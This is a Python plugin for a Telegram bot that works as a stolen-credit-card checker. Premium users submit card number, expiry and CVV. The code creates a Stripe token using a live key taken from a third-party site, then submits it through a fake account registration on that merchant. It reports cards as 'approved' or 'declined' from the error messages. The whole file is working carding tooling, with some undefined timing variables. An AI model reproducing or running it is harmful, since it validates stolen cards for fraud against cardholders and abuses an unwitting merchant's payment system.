from configss._def_main_ import * 



@Client.on_message(filters.command(["auth"], ["/", "."]))
async def cr(_, message: Message):
    
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x:
            rank = get_user_rank(message.from_user.id)
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>Usar <code>/auth card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>Usar <code>/auth card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]
            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            req = requests.get(f"https://bins.antipublic.cc/bins/{cc}").json()
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            msg=await message.reply(f"""<b>
┣ • 𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : [ʟᴏᴀᴅɪɴɢ] ■■■■□□□□ 49% 🟣 2.6(s)

┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code>
┣ • 𝘽𝘼𝙉𝙆 : {bank} 
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
┣ • 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮:  <code>@{message.from_user.username}</code></b>""")


            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=237034&pasted_fields=number&guid=14c4d026-6952-41fe-a710-01a7a366d17e4575d6&muid=874f1554-fa23-46b7-893c-aa727b5505fad64fd2&sid=4f4663c7-1c1a-41d8-a407-f866112f6e3fb3a413&key=pk_live_HPz22KIbvhjSbtZaIcmZAmfK&payment_user_agent=stripe.js%2F78ef418&card[number]={cc}&card[exp_month]={mes}&card[cvc]={cvv}&card[exp_year]={ano}'

            response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            json_first = json.loads(response.text)
            if 'error' in json_first:
                text = f"""<b> <b><a href="tg://resolve?domain=Barry_op">stripe Charged</a></b>                  
━━━━━━━━━━━━━━━━━━━
𝗖𝗖 = <code>{ccs}</code> 
𝗦𝘁𝗮𝘁𝘂𝘀 = DECLINE ❌
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = DECLINE ❌
𝙂𝙖𝙩𝙚 = stripe charged 
━━━━━━━━━━━━━━━━━━━
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{brand}-{typea}-{level}</code> 
𝗕𝗮𝗻𝗸: <code>{bank}</code>  
𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_flag} {country}|{country_name}</code> 
━━━━━━━━━━━━━━━━━━━━ 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>  
━━━━━━━━━━━━━━━━━━━
𝘿𝙀𝙑 𝘽𝙔 -› @Barry_op 
━━━━━━━━━━━━━━━━━━━━</b>
    </b>"""
                await msg.edit_text(text)
            elif 'id' not in json_first:
                text = f"""<b> <b><a href="tg://resolve?domain=Barry_op">stripe Charged</a></b>                  
━━━━━━━━━━━━━━━━━━━━ 
𝗖𝗖 = <code>{ccs}</code> 
𝗦𝘁𝗮𝘁𝘂𝘀 = DEECLINE ❌
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = DECLINE ❌
𝙂𝙖𝙩𝙚 = stripe charged 
━━━━━━━━━━━━━━━━━━━ 
━━━━━━━━━━━━━━━━━━━━  
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{brand}-{typea}-{level}</code> 
𝗕𝗮𝗻𝗸: <code>{bank}</code>  
𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_flag} {country}|{country_name}</code> 
━━━━━━━━━━━━━━━━━━━━
━━━━━━━━━━━━━━━━━━━━ 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>  
━━━━━━━━━━━━━━━━━━━
𝘿𝙀𝙑 𝘽𝙔 -› @Barry_op 
━━━━━━━━━━━━━━━━━━━━</b>
    </b>
"""
                await msg.edit_text(text)
            else:
                idw = json_first["id"]

                msg1=await msg.edit(f"""<b>
┣ • 𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
┣ • 𝙎𝙩𝙖𝙩𝙪𝙨 : [ʟᴏᴀᴅɪɴɢ] ■■■■■■□□□ 80% 🟡 2.9 (s)

┣ • 𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code> 
┣ • 𝘽𝘼𝙉𝙆 : {bank} 
┣ • 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
┣━━━━━━━━━━━━━━━━━━━━
</b>""")

                headers = {
                    'authority': 'backend.robogarden.ca',
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'es-ES,es;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8;',
                    'origin': 'https://playground.robogarden.ca',
                    'referer': 'https://playground.robogarden.ca/',
                    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
                }

                data = {
                    'username': 'ederfeer',
                    'email': 'valuedoreddf@gmail.com',
                    'password': 'ereeeegege',
                    'accountType': 'Family',
                    'plan': 'Family',
                    'period': 'quarterly',
                    'no_of_children': '3',
                    'stripe_token': idw,
                    'coupon_id': '',
                }

                response1 = requests.post('https://backend.robogarden.ca/en/register/user', headers=headers, data=data)
                
                
                
                msg2=await msg1.edit(f"""<b> 
𝗖𝗖 : <b><code>{cc}|{mes}|{ano}|{cvv}</code> 
𝙎𝙩𝙖𝙩𝙪𝙨 : [ʟᴏᴀᴅɪɴɢ] ■■■■■■■■□ 95% 🟢 3.6 (s)

𝘿𝘼𝙏𝘼 : <code>{brand}  {typea}  {level}</code> 
𝘽𝘼𝙉𝙆 : {bank} 
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 : <code>{country_name} [{country_flag}] </code>
━━━━━━━━━━━━━━━━━━━━
</b>""")
                
                if 'Your card was declined.' in response1.text:
                    await msg2.edit(f"""<b><b> <b><a href="tg://resolve?domain=Mwellawaitt">stripe Charged</a></b>                  
━━━━━━━━━━━━━━━━━━━
𝗖𝗖 = <code>{ccs}</code>
𝗦𝘁𝗮𝘁𝘂𝘀 = DECLINE ❌ 
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Your cc was declined❌</code>
𝙂𝙖𝙩𝙚 = stripe charged  
━━━━━━━━━━━━━━━━━━━━
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{brand}-{typea}-{level}</code>    
𝗕𝗮𝗻𝗸: <code>{bank}</code>   
𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_flag} {country}|{country_name}</code>  
━━━━━━━━━━━━━━━━━━━━
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b> 
━━━━━━━━━━━━━━━━━━━━
𝘿𝙀𝙑 𝘽𝙔 -› @Barry_op 
━━━━━━━━━━━━━━━━━━━━
    </b> """)
                    
                elif"Your card's security code is incorrect." in response1.text:
                    await msg2.edit(f"""<b> <b><a href="tg://resolve?domain=Mwellawaitt">Stripe charged</a></b>                   
━━━━━━━━━━━━━━━━━━━━  
𝗖𝗖 = <code>{ccs}</code>  
𝗦𝘁𝗮𝘁𝘂𝘀 = APROVVED ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = <code>Your cards security code is incorrect</code>✅  
𝙂𝙖𝙩𝙚 = stripe charged
━━━━━━━━━━━━━━━━━━━━  
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{brand}-{typea}-{level}</code>    
𝗕𝗮𝗻𝗸: <code>{bank}</code>   
𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_flag} {country}|{country_name}</code>  
━━━━━━━━━━━━━━━━━━━━   
𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>   
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>   
𝘿𝙀𝙑 𝘽𝙔 -› @Barry_op 
━━━━━━━━━━━━━━━━━━━━</b>
                    </b>
                    """)
                elif 'Your card has insufficient funds.' in response1.text:
                    await msg2.edit(f"""<b><b> <b><a href="tg://resolve?domain=Barry_op">Stripe Charged</a></b>                 
━━━━━━━━━━━━━━━━━━━━  
𝗖𝗖 = <code>{ccs}</code>  
𝗦𝘁𝗮𝘁𝘂𝘀 = APROVVED ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = Your card has insufficient funds✅ 
𝙂𝙖𝙩𝙚 = stripe charged
━━━━━━━━━━━━━━━━━━━━  
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{brand}-{typea}-{level}</code>    
𝗕𝗮𝗻𝗸: <code>{bank}</code>   
𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_flag} {country}|{country_name}</code>  
━━━━━━━━━━━━━━━━━━━━   
𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>   
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>   
𝘿𝙀𝙑 𝘽𝙔 -› @Barry_op 
━━━━━━━━━━━━━━━━━━━━
        </b>""")

                elif 'Your card number is incorrect.' in response1.text:
                    await msg2.edit(f"""<b><b> <b><a href="tg://resolve?domain=Mwellawaitt">Stripe Charged</a></b>                


━━━━━━━━━━━━━━━━━━━━  
𝗖𝗖 = <code>{ccs}</code>  
𝗦𝘁𝗮𝘁𝘂𝘀 = Invalid CardNumber ❌
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = Your card number is incorrect. 
𝙂𝙖𝙩𝙚 = stripe charged
━━━━━━━━━━━━━━━━━━━━  
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{brand}-{typea}-{level}</code>    
𝗕𝗮𝗻𝗸: <code>{bank}</code>   
𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_flag} {country}|{country_name}</code>  
━━━━━━━━━━━━━━━━━━━━   
𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>   
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>   
𝘿𝙀𝙑 𝘽𝙔 -› @Barry_op 
━━━━━━━━━━━━━━━━━━━━</b>
                    </b> """)
                elif 'succeed' in response.text:
                    await msg2.edit(f"""<b> <b><a href="tg://resolve?domain=Mwellawaitt">Stripe Charged</a></b>                
━━━━━━━━━━━━━━━━━━━  
𝗖𝗖 = <code>{ccs}</code>  
𝗦𝘁𝗮𝘁𝘂𝘀 = Aproved ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = Cvv Aproved ✅
𝙂𝙖𝙩𝙚 = stripe charged
━━━━━━━━━━━━━━━━━━━━  
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{brand}-{typea}-{level}</code>    
𝗕𝗮𝗻𝗸: <code>{bank}</code>   
𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_flag} {country}|{country_name}</code>  
━━━━━━━━━━━━━━━━━━━   
𝗧𝗼𝗼𝗸 𝘀𝗲𝗰𝗼𝗻𝗱: <i>{tiempofinal - tiempoinicio:0.2}</i></code>   
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b>   
𝘿𝙀𝙑 𝘽𝙔 -› @Barry_op 
━━━━━━━━━━━━━━━━━━━</b>
                    </b>     
        """)

                else:
                    await msg2.edit(f"""<b> <b><a href="tg://resolve?domain=Mwellawaitt">Stripe Charged</a></b>               
━━━━━━━━━━━━━━━━━━━  
𝗖𝗖 = <code>{ccs}</code>  
𝗦𝘁𝗮𝘁𝘂𝘀 = Aproved ✅
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 = Cvv Aproved ✅ 
𝙂𝙖𝙩𝙚 = stripe charged 
━━━━━━━━━━━━━━━━━━━━  
𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: <code>{brand}-{typea}-{level}</code>    
𝗕𝗮𝗻𝗸: <code>{bank}</code>   
𝘾𝙤𝙪𝙣𝙩𝙧𝙮: <code>{country_flag} {country}|{country_name}</code>  
━━━━━━━━━━━━━━━━━━━━
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮: <code>@{message.from_user.username}</code>  [{rank}]</b> 
━━━━━━━━━━━━━━━━━━━━
𝘿𝙀𝙑 𝘽𝙔 -› @Barry_op 
━━━━━━━━━━━━━━━━━━━━</b>
                    </b>     
        """)
                
        else:
            return await message.reply(f'<b>Chat no autorizado | O no eres Premium.</b>')